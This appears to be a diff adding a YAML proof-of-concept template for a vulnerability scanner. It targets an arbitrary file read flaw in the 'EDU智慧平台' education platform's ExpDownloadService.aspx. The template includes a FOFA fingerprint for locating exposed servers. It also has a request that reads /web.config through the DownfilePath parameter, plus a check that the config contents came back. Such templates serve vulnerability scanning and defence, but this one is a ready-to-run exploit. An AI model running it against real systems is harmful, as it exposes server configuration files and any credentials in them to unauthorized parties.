@@ -1,0 +1,16 @@
+id: poc-yaml-edu-system-expdownloadservice-fileread
+info:
+  name: EDU智慧平台 ExpDownloadService.aspx任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: EDU智慧平台
+  fofa: body="custom/blue/uimaker/easyui.css"
+requests:
+- method: GET
+  path: /ExpDownloadService.aspx?DownfilePath=/web.config
+  expression: "status_code == 200 && \ncontains(body,\"<configuration>\") &&\ncontains(body,\"\
+    <configSections>\") &&\ncontains(body,\"</sectionGroup>\") &&\ncontains(body,\"\
+    <add\")\n"
+variables: {}
+transport: http
